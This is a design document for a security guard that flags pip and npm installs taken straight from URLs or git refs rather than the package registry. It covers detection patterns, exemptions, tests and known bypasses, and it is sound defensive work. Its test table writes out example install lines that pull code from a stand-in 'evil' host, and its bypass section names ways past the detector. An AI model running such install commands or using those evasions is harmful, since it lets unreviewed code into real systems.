---
type: Guard
title: "untrusted-package-install-source"
description: "No package installed directly from a URL/git ref instead of the registry."
timestamp: "2026-10-20T00:00:00Z"
guard_id: "untrusted-package-install-source"
checklist_section: ["5"]
standards: ["OWASP:A08"]
---

# No package installed directly from a URL/git ref instead of the registry

_Author — 2026-07-12_

---

## The threat

`pip install <name>`/`npm install <name>` resolve through the package registry
(PyPI/npm), which applies whatever integrity controls the registry provides —
version pinning to a released, indexed artifact, yanked-release enforcement, and
(for npm) `npm audit signatures`. Installing directly from a URL or a git ref
(`pip install git+https://...`, `npm install https://.../tarball/master`, `npm
install github:user/repo`) bypasses the registry entirely: there is no pin to an
immutable released version, no way to detect a yanked/malicious release, and the
exact code that lands can depend on whatever a *mutable* branch/tag currently points
to at install time. This is a common shape in malicious agent-skill install scripts
and compromised setup instructions — fetch the real payload straight from an
attacker-controlled or attacker-compromised git remote/URL, skipping the registry's
review/scanning surface entirely. OWASP:A08 (Software and Data Integrity Failures).

## Why this guard fits the stack

`js-supply-chain` already checks `package.json` dependency *specifiers* for a
floating version (`"pkg": "*"`/`"latest"`) — a different signal read from a
different source (the manifest, not an install command). This guard closes an
adjacent gap: an install *command* in a shell script or Dockerfile that names a
non-registry source outright, which no manifest-reading check can see. It applies
universally (shell scripts and Dockerfiles exist regardless of the detected app
stack) rather than being gated on a profile feature.

## Detection design

1. **`applies()` gate** — always `True`.
2. **Files scanned** — `.sh`/`.bash` files (`iter_files`) and Dockerfiles
   (`iter_dockerfiles`); non-product paths (test fixtures) skipped via
   `is_nonproduct_path`.
3. **Patterns / logic** — per physical line, each line first split into `;`/`&`/`|`
   shell segments (trailing `#` comment stripped via the shared `strip_hash_comments`):
   - `pip-url-source` (HIGH): a `pip`/`pip3 install` segment containing a `git+`
     scheme (`git+https://`, `git+ssh://`, `git+git://`) or a bare URL ending in a
     package-archive extension (`.tar.gz`, `.tgz`, `.whl`, `.zip`). A private/internal
     registry-mirror flag and its VALUE (`--index-url <url>`, `--extra-index-url <url>`,
     `--trusted-host <host>`) are stripped out (`_INDEX_FLAG.sub`) *before* the
     source-ref test: the flag's own `https://` value installs a normally-named package
     *through* the mirror, not directly from a URL. Scoping the strip to the flag+value
     (rather than excluding the whole segment on the flag's mere presence) is deliberate:
     a mirror flag must not blind detection of an INDEPENDENT direct install target on
     the same command (`pip install --index-url URL git+https://.../x.git`).
   - `npm-url-source` (HIGH): an `npm`/`yarn`/`pnpm install`/`add`/`i` line
     containing a `git+`/bare `git://` scheme, a `github:owner/repo` shorthand, or
     a bare archive-extension URL.
4. **Pragma** — `# security: allow-untrusted-package-install-source` on the line, counted only as a real `#` comment (the `hash` comment view, so the phrase inside a quoted string does not count, #1040).
5. **Severity / standards** — both rules HIGH,
   `untrusted-package-install-source/{pip-url-source,npm-url-source}`, `OWASP:A08`.

## When NOT to flag

- An ordinary `pip install pkg==1.2.3`/`npm install pkg@1.2.3` — a plain registry
  name with no URL/git ref — stays silent.
- A private/internal registry mirror configured via `--index-url`/
  `--extra-index-url`/`--trusted-host` with no other source ref stays silent even
  though the flag value contains an `https://` substring: a legitimate, common
  enterprise pattern, not a direct-source install. (But the flag does NOT silence a
  co-located direct install target: `pip install --index-url URL git+https://.../x.git`
  still fires, because only the flag+value is stripped, not the whole segment.)
- A bare `https://`/`git+` reference that is not an argument of the install command's
  OWN shell segment stays silent. Each line is stripped of a trailing `#` comment and
  split on shell separators (`;`/`&`/`|`), so a URL in a comment
  (`pip install x  # see https://.../t.tgz`) or in an unrelated command chained after
  the install (`pip install x && wget https://.../t.tgz` — a very common Dockerfile
  `RUN` idiom) does NOT fire. The guard is anchored to the install command's segment,
  not merely to the line.

## Tests

| Test | What it checks |
|---|---|
| `test_fires_on_pip_git_install` | `pip install git+https://...` fires `pip-url-source`, HIGH |
| `test_fires_on_pip_archive_url_install` | a bare `.tar.gz` URL on a `pip3 install` line fires |
| `test_fires_on_npm_github_shorthand` | `npm install github:user/repo` fires `npm-url-source` |
| `test_fires_on_yarn_git_url` | `yarn add git+https://...` fires |
| `test_fires_on_dockerfile_run_line` | a Dockerfile `RUN pip install git+https://...` line fires |
| `test_passes_ordinary_pip_install` | a plain pinned registry install stays silent |
| `test_passes_ordinary_npm_install` | a plain pinned registry install stays silent |
| `test_passes_private_index_url` | a `--index-url` private-mirror install stays silent |
| `test_index_url_does_not_mask_source_ref` | `--index-url URL git+https://evil/...` still fires (the flag doesn't blind a co-located direct target) |
| `test_index_url_before_archive_url_still_fires` | `--trusted-host` + `--index-url` + a direct `.tar.gz` URL still fires |
| `test_index_url_equals_form_mirror_only_stays_silent` | `--index-url=URL pkg==1.0.0` (equals form, no source ref) stays silent |
| `test_short_alias_index_url_mirror_stays_silent` | pip's `-i <mirror .zip>` short alias stays silent |
| `test_short_alias_index_url_does_not_mask_source_ref` | `-i URL git+https://evil/...` still fires |
| `test_ignore_installed_flag_does_not_swallow_source_ref` | `-I git+https://evil/...` still fires (`-i` strip is case-sensitive; `-I` is `--ignore-installed`) |
| `test_passes_url_in_unrelated_chained_command` | `pip install x && wget https://.../t.tgz` — the URL is a chained `wget`, not the install target — stays silent |
| `test_passes_npm_install_then_echo_of_url` | `npm install && echo 'see github:some/repo'` stays silent |
| `test_passes_url_in_trailing_comment` | a URL in a trailing `#` comment stays silent |
| `test_fires_on_git_install_chained_after_ordinary_command` | `apt-get update && pip install git+https://...` still fires (the ref IS an install argument) |
| `test_pragma_opt_out` | the pragma on the line silences the finding |

## Known bypasses

- A multi-line, backslash-continued shell command splitting the install verb and
  the URL/git-ref across lines evades the single-line scan (this guard does not
  join continuation lines, unlike some Dockerfile-focused sibling guards).
- An install command built dynamically from variables (`pip install "$PKG_SOURCE"`)
  or wrapped in a helper function/script evades both rules entirely — this guard
  only recognizes the literal command shapes above.
- A URL without a recognized archive extension (a bespoke package server path with
  no `.tar.gz`/`.whl`/`.zip`/`.tgz` suffix) evades the bare-URL branch of both
  rules; only the `git+`/`github:` branches would still catch it if applicable.

## What this guard does NOT prove

A silent result does not prove every dependency in the project is registry-sourced
— it only means no scanned `.sh`/Dockerfile line matched one of these specific
command shapes. It does not inspect `package.json`/`requirements.txt`/`pyproject.
toml` dependency specifiers directly (see `js-supply-chain`/`python-supply-chain`
for that), does not evaluate whether a flagged install is actually malicious (a
legitimate internal fork pinned to a commit SHA looks identical to an untrusted one
at this guard's level of analysis), and cannot see install commands issued outside
a `.sh`/Dockerfile file (a CI YAML `run:` step, a Makefile target, an interactive
README instruction) — a documented, bounded gap for a first pass at this signal.

# Citations

[1] agentsec checklist item `5-untrusted-package-install-source` (§5)
[2] OWASP:A08
